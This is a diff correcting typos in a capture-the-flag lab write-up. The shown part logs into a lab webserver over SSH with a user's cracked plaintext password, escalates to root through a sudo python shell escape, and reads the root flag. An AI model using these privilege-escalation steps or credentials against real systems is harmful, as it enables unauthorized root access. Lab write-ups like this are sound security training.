@@ -112,14 +112,14 @@ Exit back out to Kali. From here we can use John the Ripper:
 
 SSH into the webserver using Steven’s credentials:  
 ~~~
-Ssh steven@192.168.1.110
+ssh steven@192.168.1.110
 Password: pink84
 ~~~
 Now we run a python exploit:
 ~~~
 sudo /usr/bin/python -c 'import os;os.system("/bin/sh")'
 whoami
-cd root
+cd /root
 cat flag4.txt
 ~~~
 ![Capture](https://user-images.githubusercontent.com/32025331/155902751-aee3738f-b49c-4601-8dfb-6d6a4ad1466b.PNG)
